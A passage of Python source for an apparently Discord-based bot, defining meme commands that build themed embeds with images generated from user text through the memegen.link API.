        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="awesome <Text 1> <Text 2>", description="Socially Awesome Penguin")
    async def awesome(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Socially Awesome Penguin""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/awesome/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="awesomeawkward <Text 1> <Text 2>", description="Socially Awesome Awkward Penguin")
    async def awesomeawkward(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Socially Awesome Awkward Penguin""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/awesome-awkward/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="awkward <Text 1> <Text 2>", description="Socially Awkward Penguin")
    async def awkward(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Socially Awkward Penguin""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/awkward/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="awkwardawesome <Text 1> <Text 2>", description="Socially Awkward Awesome Penguin")
    async def awkwardawesome(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Socially Awkward Awesome Penguin""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/awkward-awesome/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="bad <Text 1> <Text 2>", description="You Should Feel Bad")
    async def bad(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""You Should Feel Bad""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/bad/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="badchoice <Text 1> <Text 2>", description="Milk Was a Bad Choice")
    async def badchoice(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Milk Was a Bad Choice""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/badchoice/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="bd <Text 1> <Text 2>", description="Butthurt Dweller")
    async def bd(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Butthurt Dweller""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/bd/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="bender <Text 1> <Text 2>", description="I'm Going to Build My Own Theme Park")
    async def bender(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I'm Going to Build My Own Theme Park""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/bender/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="bihw <Text 1> <Text 2>", description="But it's honest work meme")
    async def bihw(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""But It's Honest Work""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/bihw/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="biw <Text 1> <Text 2>", description="Baby Insanity Wolf")
    async def biw(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Baby Insanity Wolf""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/biw/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="blb <Text 1> <Text 2>", description="Bad Luck Brian")
    async def blb(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Bad Luck Brian""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/blb/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="boat <Text 1> <Text 2>", description="I Should Buy a Boat Cat")
    async def boat(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I Should Buy a Boat Cat""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/boat/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="both <Text 1> <Text 2>", description="Why Not Both?")
    async def both(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Why Not Both?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/both/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="bs <Text 1> <Text 2>", description="This is Bull, Shark")
    async def bs(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""This is Bull, Shark""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/bs/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="buzz <Text 1> <Text 2>", description="X, X Everywhere")
    async def buzz(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""X, X Everywhere""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/buzz/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="captain <Text 1> <Text 2>", description="I am the Captain Now")
    async def captain(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I am the Captain Now""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/captain/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="captainamerica <Text 1> <Text 2>", description="Captain America Elevator Fight Dad Joke")
    async def captainamerica(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Captain America Elevator Fight Dad Joke""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/captain-america/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="cb <Text 1> <Text 2>", description="Confession Bear")
    async def cb(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Confession Bear""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/cb/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="cbg <Text 1> <Text 2>", description="Comic Book Guy")
    async def cbg(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Comic Book Guy""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/cbg/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="center <Text 1> <Text 2>", description="What is this, a Center for Ants?!")
    async def center(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""What is this, a Center for Ants?!""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/center/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ch <Text 1> <Text 2>", description="Captain Hindsight")
    async def ch(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Captain Hindsight""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ch/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="cheems <Text 1> <Text 2>", description="Cheems images")
    async def cheems(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Cheems""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/cheems/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="chosen <Text 1> <Text 2>", description="You Were the Chosen One!")
    async def chosen(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""You Were the Chosen One!""",timestamp=embed_timestamp())
